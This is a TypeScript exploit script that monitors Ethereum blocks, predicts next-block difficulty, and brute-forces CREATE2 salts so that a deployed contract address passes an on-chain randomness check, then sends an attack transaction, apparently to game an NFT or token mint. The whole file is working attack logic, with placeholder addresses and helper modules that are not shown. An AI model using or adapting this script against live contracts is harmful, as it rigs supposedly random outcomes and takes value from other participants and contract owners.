import { strict as assert } from 'assert';
import {providers, utils, constants} from "ethers";
const create2 = require('eth-create2');
const web3api = require('./web3api');
const attack = require('./attack');
const rng = require('./rng');
const diff = require('./difficulty');

const CREATOR_ADDRESS = "0x00";
const SLAVE_BYTECODE = "0x00";
const MAX_DELTA = 30;

const provider = new providers.IpcProvider("/Users/yourname/Library/Ethereum/geth.ipc");

async function main() {
    let expectedParentHash = '';
    let parentTimestamp = 0;

    const diffs: bigint[] = [];
    const salts: string[] = [];
    const addrs: string[] = [];

    provider.on('block', async (blockNumber) => {
        const block = await provider.getBlock(blockNumber);
        if (expectedParentHash !== '') {
            if (expectedParentHash === block.parentHash) {
                const delta = block.timestamp - parentTimestamp;
                assert(delta > 0);
                if (delta > MAX_DELTA) {
                    console.log('block', block.number, 'is too far in the future')
                } else {
                    assert(diffs[delta] === block.difficulty);
                    console.log('block difficulty for', block.number, 'PREDICTED CORRECTLY');
                }
            } else {
                console.log('block', block.number, 'reorg, predictions are not valid');
            }
        }
        expectedParentHash = block.hash;
        parentTimestamp = block.timestamp;
        const difficultySet = new Set();

        for (let i = 1; i < MAX_DELTA; i += 1) {
            diffs[i] = diff.calcDifficulty(block.timestamp + i, block);
            difficultySet.add(diffs[i].toString());
        }

        let difficultyToSalt = new Map<number, string>();
        let difficultyToAddr = new Map<number, string>();
        const mintNumber = await web3api.getMintNumberFromEtherscan(rng.calldata);
        difficultySet.forEach((difficulty) => {
            for (let salt = 0; ; salt++) {
                const b32_salt = utils.formatBytes32String(String(salt));
                const address = create2(CREATOR_ADDRESS, b32_salt, SLAVE_BYTECODE);
                const rngIsGood = rng.compute(mintNumber, blockNumber + 1, difficulty, address);
                if (rngIsGood) {
                    difficultyToSalt.set(Number(difficulty), b32_salt);
                    difficultyToAddr.set(Number(difficulty), address);
                    break;
                }
            }
        });
        
        for (let i = 1; i < MAX_DELTA; i+= 1) {
            const difficulty = diffs[i];
            salts[i] = difficultyToSalt.get(Number(difficulty));
            addrs[i] = utils.getAddress(String(difficultyToAddr.get(Number(difficulty))));
        }

        salts[0] = constants.HashZero;
        addrs[0] = constants.AddressZero;
        diffs[0] = 0n;

        const withFlashbots = false;
        await attack.createAndSendTransaction(block.number, parentTimestamp, diffs, salts, addrs, withFlashbots);
    });
}

main();
